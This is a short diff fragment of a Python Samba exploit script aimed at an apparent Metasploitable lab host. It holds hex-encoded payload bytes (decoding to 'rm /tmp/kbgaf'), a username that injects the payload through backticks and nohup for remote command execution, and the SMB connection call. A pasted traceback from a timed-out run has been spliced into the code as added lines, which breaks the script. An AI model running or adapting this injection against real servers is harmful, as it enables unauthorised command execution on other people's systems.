@@ -34,6 +34,23 @@ buf += "\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66"
 buf += "\x20"
 
 
+
+
+##
+ python sambaexploit.py 192.168.64.15
+Traceback (most recent call last):
+  File "/home/kali/sambaexploit.py", line 39, in <module>
+    assert conn.connect(sys.argv[1], 445)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.11/dist-packages/smb/SMBConnection.py", line 129, in connect
+    self._pollForNetBIOSPacket(timeout)
+  File "/usr/local/lib/python3.11/dist-packages/smb/SMBConnection.py", line 607, in _pollForNetBIOSPacket
+    raise SMBTimeout
+smb.base.SMBTimeout ##
+
+
+
+
 username = "/=`nohup " + buf + "`"
 password = ""
 conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
